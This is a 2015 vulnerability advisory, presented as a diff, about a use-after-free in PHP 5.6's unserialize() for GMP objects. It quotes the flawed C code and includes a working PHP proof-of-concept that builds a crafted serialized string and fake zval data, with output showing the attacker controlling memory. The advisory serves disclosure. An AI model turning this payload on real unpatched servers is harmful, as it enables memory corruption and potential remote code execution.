@@ -1,0 +1,104 @@
+Use After Free Vulnerability in unserialize() with GMP
+
+Taoguang Chen <[@chtg](http://github.com/chtg)> 
+Write Date: 2015.8.17 
+Release Date: 2015.9.4
+
+A use-after-free vulnerability was discovered in unserialize() with GMP object's deserialization that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.
+
+Affected Versions
+------------
+Affected is PHP 5.6 < 5.6.13
+
+Credits
+------------
+This vulnerability was disclosed by Taoguang Chen.
+
+Description
+------------
+
+static int gmp_unserialize(zval **object, zend_class_entry *ce, const
+unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data
+TSRMLS_DC) /* {{{ */
+{
+  ...
+
+  INIT_ZVAL(zv);
+  if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)
+    || Z_TYPE_P(zv_ptr) != IS_STRING
+    || convert_to_gmp(gmpnum, zv_ptr, 10 TSRMLS_CC) == FAILURE
+  ) {
+    zend_throw_exception(NULL, "Could not unserialize number", 0 TSRMLS_CC);
+    goto exit;
+  }
+  zval_dtor(&zv);
+
+  INIT_ZVAL(zv);
+  if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)
+    || Z_TYPE_P(zv_ptr) != IS_ARRAY
+  ) {
+    zend_throw_exception(NULL, "Could not unserialize properties", 0 TSRMLS_CC);
+    goto exit;
+  }
+
+
+The GMP object's deserialization can create ZVAL and free its
+zval_value from memory via zval_dtor(). However during deserialization
+will still allow to use R: or r: to set references to that already
+freed memory. It is possible to use-after-free attack and execute
+arbitrary code remotely.
+
+Proof of Concept Exploit
+------------
+The PoC works on standard MacOSX 10.11 installation of PHP 5.6.12.
+
+<?php
+
+$inner = 'r:2;a:1:{i:0;a:1:{i:0;r:4;}}';
+$exploit = 'a:2:{i:0;s:1:"1";i:1;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';
+
+$data = unserialize($exploit);
+
+$fakezval = ptr2str(1122334455);
+$fakezval .= ptr2str(0);
+$fakezval .= "\x00\x00\x00\x00";
+$fakezval .= "\x01";
+$fakezval .= "\x00";
+$fakezval .= "\x00\x00";
+
+for ($i = 0; $i < 5; $i++) {
+    $v[$i] = $fakezval.$i;
+}
+
+var_dump($data);
+
+function ptr2str($ptr)
+{
+  $out = '';
+  for ($i = 0; $i < 8; $i++) {
+    $out .= chr($ptr & 0xff);
+    $ptr >>= 8;
+  }
+  return $out;
+}
+
+?>
+
+
+Test the PoC on the command line:
+
+$ php uafpoc.php
+array(2) {
+  [0]=>
+  int(1122334455)  <===  so we can control the memory and create fake ZVAL :)
+  [1]=>
+  object(GMP)#1 (2) {
+    [0]=>
+    array(1) {
+      [0]=>
+      int(4325299791)
+    }
+    ["num"]=>
+    string(1) "1"
+  }
+}
